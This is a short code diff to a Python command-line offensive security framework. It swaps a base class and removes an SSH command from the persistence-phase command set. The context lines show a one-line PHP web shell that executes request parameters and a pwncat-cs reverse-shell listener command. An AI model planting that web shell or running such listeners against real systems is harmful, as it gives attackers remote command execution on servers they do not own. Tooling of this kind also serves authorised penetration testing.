@@ -13,7 +13,7 @@ import os
 
 import cmd2
 
-from cli.commands._dormancy import PendingCommandSet
+from cli.commands._base import LazyOwnCommandSet
 from modules.categories import persistence_category
 from utils import (
     GREEN,
@@ -29,7 +29,7 @@ from utils import (
 )
 
 
-class PersistenceCommandSet(PendingCommandSet):
+class PersistenceCommandSet(LazyOwnCommandSet):
     """Persistence phase commands (pending)."""
 
     phase = "persist"
@@ -98,17 +98,6 @@ if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
             return
         print_msg(f"[+] Starting pwncat-cs listener on {lhost}:{lport}")
         self.cmd(f"pwncat-cs -lp {lport}")
-
-    @cmd2.with_category(persistence_category)
-    def do_ssh(self, line):
-        """SSH into a remote host."""
-        rhost = self.params["rhost"]
-        if not check_rhost(rhost):
-            return
-        user = input(f"[?] SSH username (default: root): ") or "root"
-        port = input(f"[?] SSH port (default: 22): ") or "22"
-        print_msg(f"[+] Connecting to {user}@{rhost}:{port}")
-        self.cmd(f"ssh {user}@{rhost} -p {port}")
 
     @cmd2.with_category(persistence_category)
     def do_revwin(self, line):
